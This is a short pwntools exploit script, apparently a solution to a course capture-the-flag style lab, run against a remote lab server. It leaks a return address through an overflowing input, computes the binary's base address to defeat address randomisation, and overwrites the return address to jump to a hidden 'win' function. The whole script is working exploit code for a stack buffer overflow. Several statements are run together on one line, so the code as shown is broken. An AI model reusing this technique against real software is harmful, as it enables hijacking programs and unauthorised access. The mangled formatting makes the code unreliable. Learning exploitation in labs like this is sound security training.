from pwn import *OFFSET=0x13c7
WIN=0x1269

''' Establish Connection '''
p = remote("csc748.hostbin.org", 7051)        # Test Script Against Server
# p = process("./5-1_lab.bin")                    # Test Script Locally
# p = gdb.debug("./5-1_lab.bin")                # Debug with GDB


p.sendline(b"A"*23)

#Output: ...AAAAAA\n[ReturnAddress]
p.readuntil(b"AAAA\n")


retaddr = u64(p.read(6) + b"\x00\x00")

baseaddr = retaddr - OFFSET
winaddr = baseaddr + WIN

print("Leaked address: {:16x}".format(retaddr))print("Base address:   {:16x}".format(baseaddr))
print("Secret address: {:16x}".format(winaddr))

p.send(b"A"*24 + p64(winaddr) + b"\n")p.sendline(b"")   #exit loop and execute return address


p.interactive()

